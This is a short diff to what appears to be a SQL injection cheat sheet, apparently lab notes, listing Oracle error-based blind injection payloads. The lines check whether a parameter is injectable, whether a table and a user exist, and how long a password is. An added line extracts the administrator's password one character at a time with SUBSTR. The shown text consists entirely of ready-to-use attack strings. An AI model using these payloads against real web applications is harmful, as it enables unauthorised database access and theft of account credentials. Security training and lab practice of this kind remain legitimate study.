@@ -53,5 +53,6 @@
 ● checking parameter vuln       : ' || (SELECT NULL FROM dual) || ' --
 ● checking table existence      : ' || (SELECT NULL FROM put_table_name_here WHERE ROWNUM = 1) || ' --
 ● checking user existence       : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM put_table_name_here WHERE username='put_username_here') || ' --
-● checking password length      : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and 	LENGTH(password)>1 ) || ' --
+● checking password length      : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' and LENGTH(password)>1 ) || ' --
+● checking password             : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' and SUBSTR(password,1,1)='a' ) || ' --
 ```
